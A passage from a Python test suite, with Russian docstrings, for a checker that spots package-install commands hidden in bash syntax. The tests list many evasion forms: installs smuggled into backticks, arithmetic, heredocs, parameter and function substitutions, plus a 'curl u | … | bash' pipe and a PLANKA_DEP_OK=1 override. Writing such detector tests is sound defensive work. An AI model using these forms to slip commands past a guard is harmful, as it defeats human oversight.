        self.assertIsNone(depcheck.dependency_doubt(cmd))


class SubscriptParameterTest(unittest.TestCase):
    """`]` внутри `${…}` в индексе массива индекс не кончает (skipsubscript bash)."""

    def test_detected(self):
        for cmd in ["a[${x:-]}]=1 npm install x", "a[${x:-${y:-]}}]=1 npm i x", "a[${x}]=1 npm i x",
                    # `${` в кавычках — текст: индекс кончает первая `]`.
                    "a['${']=1 npm i x"]:
            with self.subTest(cmd):
                self.assertIsNotNone(depcheck.dependency_add(cmd))

    def test_not_adds(self):
        for cmd in ["a[x]y]=1 npm i x", "a[${x:-]y]=1 npm i x"]:
            with self.subTest(cmd):
                self.assertIsNone(depcheck.dependency_add(cmd))


class GitRebaseExecAbbreviationTest(unittest.TestCase):
    """git принимает однозначный префикс длинной опции: `--ex`, `--exe` у `rebase` — `--exec`; `--e` неоднозначен."""

    def test_detected(self):
        for cmd in ["git rebase --exe 'npm install x' main", "git rebase --exe='npm i x' main",
                    "git rebase --ex 'npm i x' main", "git rebase --ex='npm i x' main"]:
            with self.subTest(cmd):
                self.assertIsNotNone(depcheck.dependency_add(cmd))

    def test_not_adds(self):
        for cmd in ["git rebase --e 'npm i x' main", "git rebase --empty=drop main"]:
            with self.subTest(cmd):
                self.assertIsNone(depcheck.dependency_add(cmd))


class CatStdinOperandTest(unittest.TestCase):
    """`cat` с операндом stdin (`/dev/stdin`, `/dev/fd/N`, `-`) отдаёт не только файлы: here-string — текст для
    оболочки, вход из конвейера — неизвестный."""

    def test_doubt(self):
        for cmd in ["cat x.sh /dev/stdin <<< 'npm install x' | bash", "cat x.sh /dev/fd/0 <<< 'npm i x' | bash",
                    "curl u | cat x.sh /dev/stdin | bash", "cat f <(echo 'npm i x') | bash"]:
            with self.subTest(cmd):
                self.assertIsNone(depcheck.dependency_add(cmd))
                self.assertEqual(depcheck.dependency_doubt(cmd)[1], depcheck._WHY_COMPUTED)

    def test_not_doubt(self):
        # Тело heredoc в оболочке той же строки разобрано командами; файл не виден, как у `bash файл`.
        for cmd in ["cat /dev/stdin <<'EOF' | bash\nls\nEOF", "cat x.sh /dev/stdin <<'EOF' | bash\nls\nEOF",
                    "cat x.sh y.sh | bash", "cat /proc/self/fd/0 <<'EOF' | bash\nls\nEOF"]:
            with self.subTest(cmd):
                self.assertIsNone(depcheck.dependency_add(cmd))
                self.assertIsNone(depcheck.dependency_doubt(cmd))

    def test_detected(self):
        for cmd in ["cat x.sh /dev/stdin <<'EOF' | bash\nnpm install x\nEOF",
                    "cat /dev/fd/0 <<'EOF' | bash\nnpm i x\nEOF"]:
            with self.subTest(cmd):
                self.assertIsNotNone(depcheck.dependency_add(cmd))


class HeredocPipelineContinuedTest(unittest.TestCase):
    """Конвейер, продолженный за телом heredoc (`cat <<EOF |` ⏎ тело ⏎ `EOF` ⏎ `bash`): тело — вход приёмника на
    следующей строке."""

    def test_detected(self):
        for cmd in ["cat <<'EOF' |\nnpm install x\nEOF\nbash", "cat <<EOF |\nnpm i x\nEOF\nbash -s",
                    "cat <<'EOF' | tee log |\nnpm i x\nEOF\nsh", "cat <<'A' <<'B' |\nls\nA\nnpm i x\nB\nbash",
                    "cat <<'EOF' |\nnpm i x\nEOF\n\nbash"]:
            with self.subTest(cmd):
                self.assertIsNotNone(depcheck.dependency_add(cmd))

    def test_not_adds(self):
        for cmd in ["cat <<'EOF' |\nnpm install x\nEOF\ngrep npm", "cat <<'EOF' |\nls\nEOF\nbash",
                    "cat <<'EOF' |\nnpm install x\nEOF\nbash -n"]:
            with self.subTest(cmd):
                self.assertIsNone(depcheck.dependency_add(cmd))
                self.assertIsNone(depcheck.dependency_doubt(cmd))

    def test_linear(self):
        for make in [lambda n: "cat <<'EOF' |\nls\nEOF\n" * n + "bash",
                     lambda n: ("cat <<'EOF' |\nls\nEOF\nbash\n") * n]:
            small, large = make(500), make(2000)
            with self.subTest(small[:30]):
                assert_linear(self, lambda: depcheck.dependency_add(small), lambda: depcheck.dependency_add(large))
                assert_linear(self, lambda: depcheck.dependency_doubt(small),
                              lambda: depcheck.dependency_doubt(large))


class BacktickOutsideQuotesTest(unittest.TestCase):
    """`` `…` `` вне кавычек, в `$(…)`, `${…}` и арифметике кончается на первой неэкранированной обратной кавычке:
    кавычки и `#` в теле границу не меняют (bash 5.3); тело — вложенная команда со своими кавычками."""

    def test_after_detected(self):
        for cmd in ["echo `'` && npm i x", "echo `echo don't` ; npm i x", "echo `'`\nnpm i x",
                    "echo `echo a #b` ; npm i x", "echo \"$(echo `'`)\"; npm i x", "echo $(echo `'`); npm i x",
                    "echo ${x:-`'`}; npm i x", "echo `cat <<EOF`\nnpm i x\nEOF",
                    "echo `echo \\`echo '\\`` ; npm i x"]:
            with self.subTest(cmd):
                self.assertEqual(depcheck.dependency_add(cmd), "npm i x")
        self.assertEqual(depcheck.dependency_add("x=`'` npm i x"), "x=`'` npm i x")
        # Пустая подстановка на месте имени команды: bash исполняет слова за ней.
        self.assertEqual(depcheck.dependency_doubt("`'` npm i x")[1], depcheck._WHY_LAUNCHER)

    def test_body_detected(self):
        for cmd in ["echo `npm i x`", "echo `echo 'a;b'; npm i x`", "echo `echo a\nnpm i x`",
                    "PLANKA_DEP_OK=1 echo `npm i x`", "x=`npm i x` true"]:
            with self.subTest(cmd):
                self.assertIsNotNone(depcheck.dependency_add(cmd))

    def test_body_quotes_are_data(self):
        for cmd in ["echo `echo 'a; npm i x'`", 'echo `echo "a; npm i x"`', "echo `echo a #; npm i x`"]:
            with self.subTest(cmd):
                self.assertIsNone(depcheck.dependency_add(cmd))
                self.assertIsNone(depcheck.dependency_doubt(cmd))

    def test_heredoc_inside_backticks_ignored(self):
        self.assertEqual(depcheck.heredocs("echo `cat <<EOF` <<END"), [("END", False)])

    def test_heredoc_inside_open_backticks(self):
        # `` `…` `` не закрыта до конца строки: тело heredoc в ней идёт следующими строками (bash читает подстановку
        # до закрывающей обратной кавычки и разбирает тело заново).
        self.assertEqual(depcheck.heredocs("x=`cat <<EOF"), [("EOF", False)])
        # Тело heredoc из `` `…` `` идёт первым: bash читает подстановку до её конца со всеми телами, затем тела
        # строки (5.3: `` cat <<A; x=`cat <<B `` ⏎ тело B ⏎ `B` ⏎ `` ` `` ⏎ тело A ⏎ `A`).
        self.assertEqual(depcheck.heredocs("cat <<A; x=`cat <<-B"), [("B", True), ("A", False)])
        self.assertEqual(depcheck.heredocs("x=\"`cat <<EOF"), [("EOF", False)])
        self.assertEqual(depcheck.heredocs("x=`echo \\` <<B"), [("B", False)])
        self.assertEqual(depcheck.heredocs("x=`cat <<B \\`"), [("B", False)])
        self.assertEqual(depcheck.heredocs("x=`echo '<<B'"), [])
        self.assertEqual(depcheck.heredocs("echo '`' <<A"), [("A", False)])
        small, large = "x=`" + "\\`" * 20000, "x=`" + "\\`" * 80000
        assert_linear(self, lambda: depcheck.heredocs(small), lambda: depcheck.heredocs(large))

    def test_linear(self):
        for make in [lambda n: "echo " + "`a 'b'` " * n + "; npm i x", lambda n: "echo `" + "a ' " * n,
                     lambda n: "echo `" + "a\n" * n + "`", lambda n: "echo $(" + "`'` " * n + ")"]:
            small, large = make(2000), make(8000)
            with self.subTest(small[:20]):
                assert_linear(self, lambda: depcheck.dependency_add(small), lambda: depcheck.dependency_add(large))
                assert_linear(self, lambda: depcheck.dependency_doubt(small),
                              lambda: depcheck.dependency_doubt(large))


class ArithmeticQuotesTest(unittest.TestCase):
    """Кавычки в арифметике `$((…))` и `$[…]` — свой уровень для поиска её конца (bash 5.3): `'…'` прячет скобки, но
    не подстановки, `"…"` — как двойные кавычки."""

    def test_detected(self):
        for cmd in ["echo \"$((echo '$(' ) ; npm i x)\"", "echo \"$((echo '`' ) ; npm i x)\"",
                    "echo \"$((echo '))' ) ; npm i x)\"", 'echo "$(( 1 ))" "$((echo "))" ) ; npm i x)"',
                    "cat <<E\n$((echo '$(' ) ; npm i x)\nE", 'cat <<E\n$((echo "))" ) ; npm i x)\nE',
                    "echo \"$(( '$(npm i x)' ))\"", "echo \"$(( '`npm i x`' ))\"", "echo $[ '$(npm i x)' ]",
                    "cat <<E\n$(( '))' + $(npm i x) ))\nE"]:
            with self.subTest(cmd):
                self.assertIsNotNone(depcheck.dependency_add(cmd))

    def test_quotes_bound_substitution(self):
        # Подстановка в `'…'` арифметики кончается не дальше кавычки, и когда за кавычкой на строке есть ещё текст
        # и перевод строки.
        self.assertEqual(depcheck._quoted_substitutions("echo \"$(( '$(echo ' )) $(npm i x)\""),
                         ["echo ", "npm i x"])
        self.assertEqual(depcheck._quoted_substitutions("echo \"$(( '$(echo ' + '1) $(npm i x)' ))\"\n"),
                         ["echo ", "npm i x"])
        # Тело `` `…` `` в `'…'` арифметики — без экранирования обратной кавычки (bash 5.3).
        self.assertEqual(depcheck._quoted_substitutions("echo $[ '`echo \\`b\\``' ]"), ["echo `b`"])
        # Подстановка сразу за закрывающей кавычкой — снова в арифметике.
        self.assertEqual(depcheck._quoted_substitutions("echo \"$(( '1'$(npm i x) ))\""), ["npm i x"])

    def test_linear(self):
        for make in [lambda n: 'echo "$(( ' + "'$(\"' " * n + '))"', lambda n: 'echo "$(( ' + '"$(( ' * n,
                     lambda n: "echo $[ " + "'`a' " * n + "]", lambda n: 'echo "$(( ' + "'$(a) `b` ' " * n + '))"']:
            small, large = make(2000), make(8000)
            with self.subTest(small[:20]):
                assert_linear(self, lambda: depcheck.dependency_add(small), lambda: depcheck.dependency_add(large))
                assert_linear(self, lambda: depcheck.dependency_doubt(small),
                              lambda: depcheck.dependency_doubt(large))


class BacktickEscapesTest(unittest.TestCase):
    """Тело `` `…` `` bash разбирает после снятия `\\` перед `\\`, `` ` ``, `$`, в двойных кавычках — и перед `"`
    (5.3): `` \\` `` в теле — вложенная подстановка, `\\\\` — один `\\`."""

    def test_detected(self):
        for cmd in ["echo `echo \\`npm i evil\\``", "x=`echo \\`npm i evil\\``", "echo \"`echo \\`npm i evil\\``\"",
                    "echo `echo \"\\`npm i evil\\`\"`", "cat <<E\n`echo \\`npm i evil\\``\nE",
                    "echo `echo \\$(npm i evil)`", "cat <<E\n`echo \\\"a; npm i x\\\"`\nE",
                    "echo `echo \\\"a; npm i x\\\"`"]:
            with self.subTest(cmd):
                self.assertIsNotNone(depcheck.dependency_add(cmd))

    def test_not_adds(self):
        for cmd in ["echo `echo \\\\\\`npm i evil\\\\\\``", "echo `echo '\\`npm i evil\\`'`",
                    "echo \"`echo \\\"a; npm i x\\\"`\""]:
            with self.subTest(cmd):
                self.assertIsNone(depcheck.dependency_add(cmd))
                self.assertIsNone(depcheck.dependency_doubt(cmd))

    def test_body(self):
        self.assertEqual(depcheck._quoted_substitutions("echo `a \\\\ \\` \\$ \\\" \\x`"), ['a \\ ` $ \\" \\x'])
        self.assertEqual(depcheck._quoted_substitutions("echo \"`a \\\\ \\` \\$ \\\" \\x`\""), ['a \\ ` $ " \\x'])


class ComputedSubcommandTest(unittest.TestCase):
    """Подкоманда менеджера — подстановка или переменная: установка она или нет, известно только при исполнении
    (сомнение _WHY_SUBCOMMAND); слово может раскрыться и во флаг (`pip $FLAGS install x`), и в несколько слов
    (`npm $(echo i evil)`)."""

    def test_doubt(self):
        for cmd in ["npm $(echo i) evil", "yarn `echo add` x", "pip `echo install` evil", "npm $X evil",
                    "V=install; npm $V lodash", "npm $(echo i evil)", "pip $FLAGS install x", "npm \"$CMD\" x",
                    "pnpm -C sub ${V:-add} x", "uv $X npm i x", "conda $X numpy", "gem $X rails", "apt-get $X foo",
                    "brew $X foo", "npx pnpm $X evil", "uv run npm $X evil", "python -m pip $X evil",
                    "npx $X i evil", "npm exec $X i evil", "sudo npm $X -g evil", "npm $X -- -h evil",
                    # У winget `-h` — `--silent` (справка — `-?`, `--help`), у nuget справка — `-help`, `-?`; у
                    # port, nix, scoop, vcpkg `-h` справкой не задокументирован.
                    "winget $X foo -h", "nuget $X foo -h", "port $X foo -h", "nix $X nixpkgs#foo -h",
                    "scoop $X foo -h", "vcpkg $X foo -h"]:
            with self.subTest(cmd):
                self.assertIsNone(depcheck.dependency_add(cmd))
                self.assertEqual(depcheck.dependency_doubt(cmd)[1], depcheck._WHY_SUBCOMMAND)

    def test_not_doubt(self):
        for cmd in ["npm run $SCRIPT", "npm --prefix $D test", "echo npm $X evil", "npm test $X", "uv run $X",
                    "python $SCRIPT", "git $X", "PLANKA_DEP_OK=1 npm $X evil", "uv $c --help", "pnpm $a -h x",
                    "apt-get $X --help", "winget $X foo -?", "winget $X foo --help", "nuget $X foo -Help",
                    "nuget $X foo -?", "choco $X foo -h"]:
            with self.subTest(cmd):
                self.assertIsNone(depcheck.dependency_add(cmd))
                self.assertIsNone(depcheck.dependency_doubt(cmd))


class ArithmeticOutsideQuotesTest(unittest.TestCase):
    """Арифметику вне `"…"` bash раскрывает, как текст в `"…"`: `$(…)` и `` `…` `` в её `'…'` исполняются (5.3) —
    `$((…))`, `((…))`, `for ((…))`, индекс в присваивании `a[…]=` (и в `declare`, в элементе массива `([…]=…)`),
    индекс `${a[…]}` и смещение `${x:…}`."""

    DETECTED = ["echo $(( '$(npm i x)' ))", "(( '$(npm i x)' ))", "for (( i='$(npm i x)'; 0; )); do :; done",
                "echo $(( '`npm i x`' ))", "x=$(( '$(npm i x)' ))", "echo $(( 1 +\n '$(npm i x)' ))",
                "echo $(( '))' + '$(npm i x)' ))", "(( 1 )) && (( '$(npm i x)' ))", "echo $(( ( '$(npm i x)' ) ))",
                "a['$(npm i x)']=1", "a['$(npm i x)']+=1", "a[b[1]+'$(npm i x)']=1", "a[1 + '$(npm i x)']=3",
                "declare b['$(npm i x)']=1",
                "typeset b['$(npm i x)']=1", "a=(['$(npm i x)']=1 [1]=2)", "a+=(x ['$(npm i x)']=1)",
                "x=1; echo ${x:'$(npm i x)'}", "x=1; echo ${x: '$(npm i x)'}", "x=1; echo ${x:1:'$(npm i x)'}",
                "echo ${a['$(npm i x)']}", "echo ${a['$(npm i x)']:-z}", "echo ${a[ 1 + '$(npm i x)' ]}",
                "echo ${!a['$(npm i x)']}", "echo ${@:'$(npm i x)'}", "echo ${x:-1}${a['$(npm i x)']:-z}",
                "a[1]=1; echo ${a[1]:'$(npm i x)'}", "echo ${x:-$(( '$(npm i x)' ))}"]
    NOT_ADDS = ["echo ${x:-'$(npm i x)'}", "echo ${x:+'$(npm i x)'}", "echo ${x:='$(npm i x)'}",
                "echo ${x:?'$(npm i x)'}", "echo ${x/'$(npm i x)'/}", "echo ${x:1}${y:-'$(npm i x)'}",
                "echo ${a[1]:-'$(npm i x)'}", "echo $(( 1 )) '$(npm i x)'", "(( 1 )) && echo '$(npm i x)'",
                "echo a['$(npm i x)']", "echo $((echo '$(npm i x)') )", "((echo '$(npm i x)') )",
                "[[ $x == '$(npm i x)' ]]", "a[1]=1 '$(npm i x)'", "echo ${a[1]} '$(npm i x)'",
                "( (echo '$(npm i x)'))", "echo ${x:1} '$(npm i x)'"]

    def test_detected(self):
        for cmd in self.DETECTED:
            with self.subTest(cmd):
                self.assertIsNotNone(depcheck.dependency_add(cmd))

    def test_not_adds(self):
        for cmd in self.NOT_ADDS:
            with self.subTest(cmd):
                self.assertIsNone(depcheck.dependency_add(cmd))
                self.assertIsNone(depcheck.dependency_doubt(cmd))

    def test_bodies(self):
        self.assertEqual(depcheck._quoted_substitutions("echo ${a['$(b)']:-'$(c)'} ${x:'`d`'}"), ["b", "d"])
        self.assertEqual(depcheck._quoted_substitutions("a['$(b)'] c['$(d)']=1"), ["d"])
        # Индекс не закрыт до конца текста: не присваивание.
        self.assertEqual(depcheck._quoted_substitutions("a['$(b)' c"), [])

    def test_linear(self):
        for make in [lambda n: "echo " + "$(( '$(a)' )) " * n, lambda n: "echo " + "(( " * n,
                     lambda n: "echo " + "$((x " * n + ") " * n, lambda n: "a[" * n + "=1",
                     lambda n: "a[ " * n + "'", lambda n: "echo " + "${a[ " * n, lambda n: "echo " + "${x:" * n,
                     lambda n: "echo " + "${a[1]:'" * n, lambda n: "x " + "a['$(b)'] " * n,
                     lambda n: "echo " + "$(( " * n + "))" * n, lambda n: "((x) " * n + ")" * n]:
            small, large = make(2000), make(8000)
            with self.subTest(small[:20]):
                assert_linear(self, lambda: depcheck.dependency_add(small), lambda: depcheck.dependency_add(large))
                assert_linear(self, lambda: depcheck.dependency_doubt(small),
                              lambda: depcheck.dependency_doubt(large))


class ParameterExpansionSpaceTest(unittest.TestCase):
    """Пробел и перевод строки внутри `${…}` вне кавычек — часть слова: bash читает `${…}` до `}` целиком (5.3:
    `${x:- }npm i x` после деления раскрытия на слова — `npm i x`)."""

    def test_doubt(self):
        for cmd in ["${x:- }npm i evil", "${x:-a b}npm i evil", "${x:+a b}npm i evil", "${x:-${y:- }}npm i evil",
                    "${x:-\n}npm i evil", "${x:-npm i evil}", "${x:- npm i evil }+", "${x:-npm i evil}1]",
                    "${x:-npm} i evil", "${x:-sudo npm} i evil"]:
            with self.subTest(cmd):
                self.assertIsNone(depcheck.dependency_add(cmd))
                self.assertEqual(depcheck.dependency_doubt(cmd)[1], depcheck._WHY_NAME)

    def test_detected(self):
        for cmd in ["echo ${x:- }; npm i evil", "echo ${x:-a b}\nnpm i evil", "X=${x:- } npm i evil"]:
            with self.subTest(cmd):
                self.assertIsNotNone(depcheck.dependency_add(cmd))

    def test_not_doubt(self):
        for cmd in ["echo ${x:- } && npm test", "echo ${x:-a b} npm i x", "echo ${x:-a }}npm i x",
                    "echo ${x:-'}'  } npm i x"]:
            with self.subTest(cmd):
                self.assertIsNone(depcheck.dependency_add(cmd))
                self.assertIsNone(depcheck.dependency_doubt(cmd))

    def test_words(self):
        self.assertEqual([w for w, _ in depcheck._split("a ${x:- b}c ${y:-\\}} d", braces=True)],
                         ["a", "${x:- b}c", "${y:-}}", "d"])
        self.assertEqual([w for w, _ in depcheck._split("a ${x:- b}c d")], ["a", "${x:- b}c", "d"])

    def test_linear(self):
        for make in [lambda n: "echo " + "${x:- " * n, lambda n: "echo " + "${x:- a} " * n + "; npm i x"]:
            small, large = make(2000), make(8000)
            with self.subTest(small[:20]):
                assert_linear(self, lambda: depcheck.dependency_add(small), lambda: depcheck.dependency_add(large))
                assert_linear(self, lambda: depcheck.dependency_doubt(small),
                              lambda: depcheck.dependency_doubt(large))


class SubscriptWordQuotesTest(unittest.TestCase):
    """Слово с `[` без `=` за `]` — не присваивание: отбрасываются только тела из `'…'` прямо в его индексе (вне
    присваивания `'…'` — литерал), а `"$(…)"`, `` `…` `` и `${…}` в слове — подстановки, bash их исполняет
    (`[ -n "$(npm i x)" ]`)."""

    DETECTED = ['[ "$(npm i evil)" = x ]', '[ -n "$(npm i evil)" ]', '[[ "$(npm i evil)" == x ]]',
                '[ -n "`npm i evil`" ]', 'if [ "$(npm i evil)" ]; then :; fi', '[ x = "$(npm i evil)" ] && echo y',
                'echo [ "$(npm i evil)" ]', '[a "$(npm i evil)" ]', '[ "$(npm i evil)"', 'a[ "$(npm i evil)" ]',
                '[ ${x:-"$(npm i evil)"} ]', '[ "${x:-$(npm i evil)}" ]', 'echo x [ "$(npm i evil)"',
                "[ -n `npm i evil` ]", "echo [ `npm i evil`", "[[ `npm i evil` ]]",
                "if [[ -z `npm i evil` ]]; then :; fi", "a['$(npm i evil)' \"$(npm i evil)\"]",
                "a['x' $(( '$(npm i evil)' ))]", "x=1; a[${x:'$(npm i evil)'}]"]
    NOT_ADDS = ["[ '$(npm i x)' ]", "[[ '`npm i x`' == a ]]", "a['$(npm i x)' \"y\"]", "[ 'x' '$(npm i x)'"]

    def test_detected(self):
        for cmd in self.DETECTED:
            with self.subTest(cmd):
                self.assertIsNotNone(depcheck.dependency_add(cmd))

    def test_not_adds(self):
        for cmd in self.NOT_ADDS:
            with self.subTest(cmd):
                self.assertIsNone(depcheck.dependency_add(cmd))
                self.assertIsNone(depcheck.dependency_doubt(cmd))

    def test_bodies(self):
        self.assertEqual(depcheck._quoted_substitutions('[ "$(b)" = \'$(c)\' ]'), ["b"])
        self.assertEqual(depcheck._quoted_substitutions("a['$(b)' \"$(c)\" `d`]"), ["c", "d"])
        self.assertEqual(depcheck._quoted_substitutions("a['$(b)' \"$(c)\""), ["c"])

    def test_linear(self):
        for make in [lambda n: '"$(b)" ' * n + "a['$(c)'] " * n, lambda n: "a[" + "'$(b)' \"$(c)\" " * n,
                     lambda n: "[ " + "'$(b)' " * n + "]", lambda n: ("\"$(b)\" " * n + "a['$(c)'] ") * 4]:
            small, large = make(2000), make(8000)
            with self.subTest(small[:20]):
                assert_linear(self, lambda: depcheck.dependency_add(small), lambda: depcheck.dependency_add(large))
                assert_linear(self, lambda: depcheck.dependency_doubt(small),
                              lambda: depcheck.dependency_doubt(large))


class DoubleDollarTest(unittest.TestCase):
    """`$$` — параметр PID целиком: `{` за ним не открывает `${…}` (bash 5.3: `x=$${ echo RAN }` — присваивание
    `x=<pid>{` и команда `echo RAN }`)."""

    DETECTED = ["x=$${ npm i evil }", "FOO=$${ npm i evil }", "env x=$${ npm i evil }", "x=a$${ npm i evil}",
                "x=$${\nnpm i evil }", "x=$${a npm i evil }", "echo $${a; npm i evil }", "echo $${a | npm i evil }",
                "echo $$$${a; npm i evil }", "echo $$'\\' \"$(npm i evil)\"", 'echo "$$(cat <<E)"\nnpm i evil\nE']
    # `$$(` в `"…"` не начинает подстановку: `--dry-run` — отдельное слово; в `'…'` арифметики — текст.
    NOT_ADDS = ["echo $${x:-a} npm", "echo $$ npm i x", "echo \"$$(npm i x)\"", 'npm i "$$(" --dry-run ")"',
                "echo \"$(( '$$(npm i x)' ))\"", "echo $(( '$$(npm i x)' ))"]

    def test_detected(self):
        for cmd in self.DETECTED:
            with self.subTest(cmd):
                self.assertIsNotNone(depcheck.dependency_add(cmd))

    def test_not_adds(self):
        for cmd in self.NOT_ADDS:
            with self.subTest(cmd):
                self.assertIsNone(depcheck.dependency_add(cmd))
                self.assertIsNone(depcheck.dependency_doubt(cmd))

    def test_words(self):
        self.assertEqual([w for w, _ in depcheck._split("x=$${ a b }", braces=True)], ["x=$${", "a", "b", "}"])
        self.assertEqual([w for w, _ in depcheck._split("x=$${ a b }")], ["x=$${", "a", "b", "}"])
        self.assertEqual(depcheck.heredocs("echo $${a; cat <<E"), [("E", False)])

    def test_linear(self):
        for make in [lambda n: "echo " + "$${ " * n, lambda n: "x=" + "$$" * n + "{ npm i x }",
                     lambda n: "echo \"" + "$$(" * n + "\""]:
            small, large = make(2000), make(8000)
            with self.subTest(small[:20]):
                assert_linear(self, lambda: depcheck.dependency_add(small), lambda: depcheck.dependency_add(large))
                assert_linear(self, lambda: depcheck.dependency_doubt(small),
                              lambda: depcheck.dependency_doubt(large))


class FunctionSubstitutionTest(unittest.TestCase):
    """Подстановка функции bash 5.3: `${ …; }` (за `{` — пробел, таб или перевод строки) и `${| …; }` — тело
    исполняется командами, как у `$(…)`. Конец — `}` там, где bash принимает зарезервированное слово (после `;`,
    `&`, `|`, перевода строки, `(`, `)` подоболочки или шаблона `case`, зарезервированного слова, `]]`, `))`, имени
    после `function` и `coproc`); `{` там же открывает группу со своей `}`. Сверено с bash 5.3 (`echo RAN`)."""

    DETECTED = [
        "echo ${ npm i evil; }", 'echo "${ npm i evil; }"', "x=${ npm i evil; }", "echo ${| npm i evil; }",
        'echo "${| npm i evil; }"', "echo ${|npm i evil; }", "echo ${\tnpm i evil; }", 'echo "${\nnpm i evil\n}"',
        "echo ${\nnpm i evil\n}", "echo ${x:-${ npm i evil; }}", 'echo "${x:-${ npm i evil; }}"',
        "echo $(( ${ npm i evil; } ))", "echo $[ ${ npm i evil; } ]", "cat <<E\n${ npm i evil; }\nE",
        "echo $(( '${ npm i evil; }' ))", 'echo "${ echo }; npm i evil; }"', 'echo "${ { echo a; }; npm i evil; }"',
        'echo "${ if true; then { echo a; }; fi; npm i evil; }"', 'echo "${ function f { echo; }; npm i evil; }"',
        'echo "${ [[ a ]] && npm i evil; }"', 'echo "${ echo then }; npm i evil; }"',
        'echo "${ (echo a) }"; npm i evil', 'echo "${ [[ a ]] }"; npm i evil', 'echo "${ ((1)) }"; npm i evil',
        'echo "${ if true; then echo b; fi }"; npm i evil', 'echo "${ echo \\\n}; npm i evil; }"',
        'echo "${ echo a; }}"; npm i evil', 'echo "${ case a in a) echo;; esac }"; npm i evil',
        'echo "${ echo a <(echo b) }; npm i evil; }"', 'echo "${ coproc { echo a; }; npm i evil; }"',
        'echo "${ echo a; }x"; npm i evil', 'echo "${ x=1 }; npm i evil; }"', 'echo "${ echo fi}; npm i evil; }"',
        'echo "${ echo "}"; npm i evil; }"', 'echo "${ echo \\}; npm i evil; }"',
        'echo "${ f() { echo; }; npm i evil; }"', 'echo "${ echo a >& }; npm i evil; }"',
        'echo "${ echo a # }\nnpm i evil; }"', 'echo "${ echo $(echo x) }; npm i evil; }"',
        'echo "${ echo ${ echo; } }; npm i evil; }"', 'echo "${ ! true; npm i evil; }"',
        'echo "${ while false; do :; done }"; npm i evil', 'echo "${ for x in a; do { echo; }; done; npm i evil; }"',
        'echo "${ [[ a ]]\n}"; npm i evil', 'echo "${ [[ a &&\n b ]] }"; npm i evil',
        'echo "${ echo $$ }; npm i evil; }"', 'echo "${ cat <<E\n}\nE\nnpm i evil; }"']
    NOT_ADDS = ["echo \"${ echo 'npm i x'; }\"", 'echo "${ echo a; } npm i x"', "echo '${ npm i x; }'",
                'echo "${x} npm i x"', "echo ${ echo a; } npm i x", 'echo "$${ npm i x; }"']

    def test_detected(self):
        for cmd in self.DETECTED:
            with self.subTest(cmd):
                self.assertIsNotNone(depcheck.dependency_add(cmd))

    def test_not_adds(self):
        for cmd in self.NOT_ADDS:
            with self.subTest(cmd):
                self.assertIsNone(depcheck.dependency_add(cmd))
                self.assertIsNone(depcheck.dependency_doubt(cmd))

    def test_bodies(self):
        self.assertEqual(depcheck._quoted_substitutions('echo "${ a; }" ${| b; } x'), [" a; ", " b; "])
        self.assertEqual(depcheck._quoted_substitutions('echo "${ { a; }; }"'), [" { a; }; "])
        self.assertEqual([w for w, _ in depcheck._split("x=${ a b; } c", braces=True)], ["x=${ a b; }", "c"])
        self.assertEqual(depcheck.heredocs('echo "${ cat <<E'), [("E", False)])

    def test_linear(self):
        for make in [lambda n: "echo " + "${ " * n, lambda n: 'echo "' + "${ { " * n,
                     lambda n: 'echo "${ ' + "echo } " * n + '; }"', lambda n: 'echo "${ ' + "then " * n + '}"',
                     lambda n: "echo ${ " + "a; } " * n, lambda n: 'echo "${ ' + "[[ " * n + '}"',
                     lambda n: 'echo "${ ' + "\\\n" * n + '}"', lambda n: "echo " + "${ x; }" * n + " npm i x"]:
            small, large = make(2000), make(8000)
            with self.subTest(small[:20]):
                assert_linear(self, lambda: depcheck.dependency_add(small), lambda: depcheck.dependency_add(large))
                assert_linear(self, lambda: depcheck.dependency_doubt(small),
                              lambda: depcheck.dependency_doubt(large))


class HeredocInSubstitutionEndTest(unittest.TestCase):
    """Heredoc внутри `$(…)` или `${ …; }`: строка с терминатором в начале и `)` или `}` в остатке кончает тело,
    остаток bash читает заново командами (5.3, make_here_document: `$(cat <<E` ⏎ `x` ⏎ `Ezz y); …` исполняет
    `zz y` и команду за подстановкой)."""

    DETECTED = ['echo "$(cat <<E\nx\nE) b"; npm i evil', "echo $(cat <<E\nx\nE); npm i evil",
                "echo $(\ncat <<E\nx\nE); npm i evil", "echo $(cat <<E\nx\nEzz y); npm i evil",
                'echo "${ (cat <<E\nx\nE foo}\n); npm i evil; }"', 'echo "${ cat <<E\nx\nE} b"; npm i evil',
                "echo ${ cat <<E\nx\nE }; npm i evil", "x=$(cat <<-E\n\tx\n\tE ); npm i evil",
                'echo "a ${| { echo b; }\necho fi} | cat <<E\n}\nE }|| } b"x; npm i evil',
                'echo "${\nfunction f { echo g; } || cat <<E\n}\nE\\ & }"; npm i evil',
                'echo "${ cat <<\'E\'\nE}${ npm i evil; }"',
                # Группа и подоболочка знак не меняют: тело `${ …; }` разбирается заново со своим знаком.
                "x=${ { cat <<E\nx\nE}\nnpm i evil\nE\n} }",
                "${ cat <<E\nnpm i evil \\${| [[ [ ${| \nE)]=then \"\nE}fi\nnpm i evil"]
    # Остаток с закрывающим знаком закрывает подстановку, команда за ним — текст строки; heredoc вне подстановки
    # кончается только своим терминатором; знак другой подстановки, чем самая внутренняя, тело не кончает (bash 5.3).
    NOT_ADDS = ['echo "$(cat <<E\nx\nE ); npm i x; ) b"', 'echo "${ cat <<E\nx\nE }; npm i x; } b"',
                "cat <<E\nx\nE); npm i x\nE", "x=$(cat <<E\nx\nE}\nnpm i x\nE\n)",
                "x=$( (cat <<E\nx\nE}\nnpm i x\nE\n) )", "(cat <<E\nx\nE)\nnpm i x\nE\n)",
                "x=${ (cat <<E\nx\nE)\nnpm i x\nE\n); }", "x=${ echo $(cat <<E\nx\nE}\nnpm i x\nE\n); }",
                "x=$( echo ${ cat <<E\nx\nE)\nnpm i x\nE\n}; )"]

    def test_detected(self):
        for cmd in self.DETECTED:
            with self.subTest(cmd):
                self.assertIsNotNone(depcheck.dependency_add(cmd))

    def test_not_adds(self):
        for cmd in self.NOT_ADDS:
            with self.subTest(cmd):
                self.assertIsNone(depcheck.dependency_add(cmd))
                self.assertIsNone(depcheck.dependency_doubt(cmd))

    def test_linear(self):
        # Много heredoc на одной строке и строка из их терминаторов: тела кончаются по одному.
        for make in [lambda n: "echo $(cat <<E\n" + "E x\n" * n + "E)", lambda n: "echo $(" + "cat <<E\nE );" * n,
                     lambda n: 'echo "${ ' + "cat <<E\nE };" * n + '"',
                     lambda n: "x=$(cat" + " <<-E" * n + "\n" + "E" * n + ")\n)\n",
                     lambda n: "x=$(\ncat" + " <<-E" * n + "\n" + "E" * n + ")\n)\n",
